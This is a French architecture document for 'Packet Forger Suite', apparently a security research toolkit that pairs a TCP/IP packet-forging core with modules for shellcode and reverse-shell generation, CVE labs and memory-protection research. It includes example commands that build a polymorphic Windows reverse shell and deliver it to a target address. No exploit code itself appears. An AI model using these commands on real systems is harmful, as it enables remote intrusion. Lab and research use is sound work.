# 🏗️ Architecture - Packet Forger Suite

## 🧭 Principe de Séparation des Responsabilités

**Le core transporte, les annexes génèrent.**

Chaque module a une responsabilité unique et bien définie, avec des interfaces claires pour la communication.

## 📦 Modules

### 🟢 PROJET 1 — packet-forger-core

**Objectif** : Fournir une librairie et un outil de forge de paquets TCP/IP bas niveau, RFC-compliant, capable de transporter des payloads arbitraires.

#### ✅ Responsabilités (Strictes)

**À garder / renforcer** :
- Construction IP/TCP (RFC 791 / 793 / 1122)
- Handshake TCP manuel
- Gestion fine :
  - SEQ / ACK
  - Flags
  - Fenêtres
  - Options TCP
- Fragmentation IP
- Profils de stack TCP (Linux-like, Windows-like, custom)
- Interaction avec la stack kernel (RST, collisions, etc.)
- Capture et validation Wireshark

#### ❌ Ce que le Core ne fait PAS

- ❌ Générer du shellcode
- ❌ Connaître ASLR / ROP
- ❌ Cibler des CVE
- ❌ Implémenter SMB/HTTP complexes
- ❌ Décider si un payload est "offensif"

#### 📦 Interface Clé (Contrat)

```c
// packet-forger-core/include/payload_interface.h

typedef struct {
    unsigned char *data;      // Payload opaque
    size_t length;            // Taille en bytes
    const char *description;  // Optionnel, pour debug
} payload_t;

typedef struct {
    const char *target_ip;
    int target_port;
    const char *source_ip;
    int source_port;
    int ttl;
    int window_size;
    // ... autres paramètres TCP/IP
} transport_profile_t;

int send_payload(payload_t *payload, transport_profile_t *profile);
```

**Contrat** : Le core transporte des octets, point. Il ne sait pas ce qu'est un shellcode.

#### 📁 Structure

```
packet-forger-core/
├── src/
│   ├── packet_builder.c      # Construction IP/TCP
│   ├── tcp_handshake.c       # Handshake stateful
│   ├── checksum.c             # Calculs checksums
│   ├── ip_fragmentation.c     # Fragmentation IP
│   ├── traffic_stealth.c      # Profils TCP OS-like
│   ├── smb_wrapper.c          # Encapsulation SMB (transport uniquement)
│   └── payload_wrapper.c      # Encapsulation générique
├── include/
│   ├── packet_forger.h        # Structures IP/TCP
│   └── payload_interface.h    # Interface payload opaque
└── tests/
    └── network_tests.c        # Tests unitaires réseau
```

---

### 🔵 PROJET 2 — packet-forger-payloads

**Objectif** : Générer des payloads binaires exécutables, optimisés pour être transportés par le core, sans dépendance inverse.

#### ✅ Responsabilités

**À inclure ici** :
- Shellcode Linux x64
- Shellcode Windows x64
- Reverse shell / bind shell
- NASM-only pipeline
- Polymorphisme
- Encodage (XOR, transformations)
- Résolution dynamique d'API Windows

#### 🔗 Lien avec le Core

**Relation unidirectionnelle** : `payloads ──▶ core`

```
payloads  ──▶  core
   │            │
   │            │
   └─ génère    └─ transporte
   payload.bin  (opaque)
```

**Workflow** :
1. `packet-forger-payloads` génère `payload.bin`
2. `packet-forger-core` lit `payload.bin` et le transporte
3. Aucune dépendance inverse

#### 📁 Structure

```
packet-forger-payloads/
├── src/
│   ├── shellcode_generator.c         # Génération Linux/Windows
│   ├── asm_generator.c                # Pipeline NASM
│   ├── polymorphic_shellcode.c        # Polymorphisme
│   ├── windows_shellcode_generator.c  # Résolution dynamique API
│   ├── bind_shell.c                    # Bind shell
│   └── shellcode_encoder.c            # Encodage XOR
├── include/
│   └── payload_generator.h
├── cli/
│   └── payload_builder.c              # CLI indépendante
└── output/
    ├── payload.bin                    # Format binaire standard
    └── payload.json                   # Metadata optionnelle
```

#### 📦 Format de Sortie

**Format binaire** : `.bin` (raw bytes)

**Metadata optionnelle** : `.json`
```json
{
    "platform": "windows",
    "type": "reverse_shell",
    "size": 512,
    "polymorphic": true,
    "encoded": false,
    "lhost": "192.168.10.20",
    "lport": 4444
}
```

#### 💻 CLI Indépendante

```bash
# Génération
packet-forger-payloads build windows reverse \
    --lhost 192.168.10.20 \
    --lport 4444 \
    --polymorphic \
    --output payload.bin

# Sortie : payload.bin + payload.json
```

---

### 🟠 PROJET 3 — packet-forger-labs

**Objectif** : Fournir des laboratoires contrôlés démontrant comment un payload transporté peut déclencher une exécution, sans que le core en soit responsable.

#### ✅ Contenu

- Serveurs vulnérables
- CVE documentées
- POC non intégrés
- Scripts de test
- Captures réseau annotées

#### 📌 Principe

**Aucun code CVE dans le core.**

Les CVE applicatives sont :
- Documentées
- Payloads fournis manuellement au core
- Scénarios de test contrôlés

#### 📁 Structure

```
packet-forger-labs/
├── cve/
│   ├── CVE-2021-44228/        # Log4Shell
│   │   ├── README.md
│   │   ├── payload.bin
│   │   └── test_server.py
│   ├── CVE-2017-5638/         # Struts
│   └── CVE-2022-22965/        # Spring4Shell
├── servers/
│   ├── buffer_overflow/       # Serveur BO contrôlé
│   ├── smb_vulnerable/        # SMB vulnérable
│   └── http_vulnerable/       # HTTP Range DoS
└── scenarios/
    ├── mitm/                  # Scénarios MITM
    └── rce/                   # Scénarios RCE documentés
```

#### 📚 Documentation

Chaque scénario documente clairement :
- **payload reçu ≠ payload exécuté automatiquement**
- Conditions nécessaires à l'exécution
- Limitations et prérequis
- Captures réseau annotées

---

### 🟣 PROJET 4 — packet-forger-research

**Objectif** : Explorer les limites théoriques et pratiques des protections mémoire sans promesse d'automatisation.

#### ✅ Contenu

- Docs ASLR / DEP / Canary
- Templates ROP (théoriques)
- Analyse de réponses réseau
- Corrélation réseau ↔ mémoire
- Études de cas

#### 📌 Principe

**Recherche, pas framework.**

- Aucun lien runtime avec le core
- Documentation théorique
- Études de cas
- Directions de recherche

#### 📁 Structure

```
packet-forger-research/
├── memory/
│   ├── aslr.md                # Documentation ASLR
│   ├── dep.md                 # Documentation DEP/NX
│   └── canary.md              # Documentation Stack Canary
├── rop/
│   ├── templates/              # Templates théoriques
│   └── analysis/              # Analyse de réponses
└── case_studies/
    └── real_world/            # Études de cas réels
```

---

## 🔗 Communication Entre Modules

### Interface Payload (Core ↔ Payloads)

```c
// packet-forger-core/include/payload_interface.h

// Le core accepte un payload opaque
int send_payload(payload_t *payload, transport_profile_t *profile);

// Les payloads génèrent un fichier binaire
int generate_payload(const char *platform, const char *type, 
                     payload_config_t *config, const char *output_file);
```

### Workflow Typique

```bash
# 1. Générer le payload
packet-forger-payloads build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --output payload.bin

# 2. Transporter via le core
packet-forger-core --payload payload.bin \
    --target 192.168.10.5 --port 80 \
    --transport-profile windows

# 3. Tester dans les labs (optionnel)
cd packet-forger-labs/cve/CVE-2021-44228/
./test_server.py
packet-forger-core --payload ../payload.bin --target localhost --port 8080
```

---

## 📊 Matrice de Responsabilités

| Fonctionnalité | Core | Payloads | Labs | Research |
|----------------|------|----------|------|----------|
| **Forge TCP/IP** | ✅ | ❌ | ❌ | ❌ |
| **Handshake TCP** | ✅ | ❌ | ❌ | ❌ |
| **Fragmentation IP** | ✅ | ❌ | ❌ | ❌ |
| **Génération shellcode** | ❌ | ✅ | ❌ | ❌ |
| **Polymorphisme** | ❌ | ✅ | ❌ | ❌ |
| **Résolution API Windows** | ❌ | ✅ | ❌ | ❌ |
| **CVE applicatives** | ❌ | ❌ | ✅ | ❌ |
| **Serveurs vulnérables** | ❌ | ❌ | ✅ | ❌ |
| **ROP théorique** | ❌ | ❌ | ❌ | ✅ |
| **ASLR/DEP docs** | ❌ | ❌ | ❌ | ✅ |

---

## 🎯 Avantages de cette Architecture

1. **Séparation claire** : Chaque module a une responsabilité unique
2. **Maintenabilité** : Évolution indépendante de chaque module
3. **Crédibilité** : Core agnostique, annexes spécialisées
4. **Extensibilité** : Facile d'ajouter de nouveaux modules
5. **Testabilité** : Tests unitaires par module
6. **Documentation** : Chaque module documente son propre scope

---

## 📚 Documentation Partagée

Le dossier `docs/` contient la documentation partagée :

- `ARCHITECTURE.md` (ce fichier)
- `ROADMAP.md` (feuille de route)
- `RFC_COMPLIANCE.md` (conformité RFC)
- `PAYLOAD_INTERFACE.md` (interface payload)
- `INTEGRATION_GUIDE.md` (guide d'intégration)

---

## 🔄 Migration Progressive

La migration se fait progressivement, sans casser le code existant :

1. **Phase 1** : Créer la structure, extraire le core
2. **Phase 2** : Migrer les payloads
3. **Phase 3** : Créer les labs
4. **Phase 4** : Ajouter la recherche

Chaque phase est indépendante et peut être testée séparément.

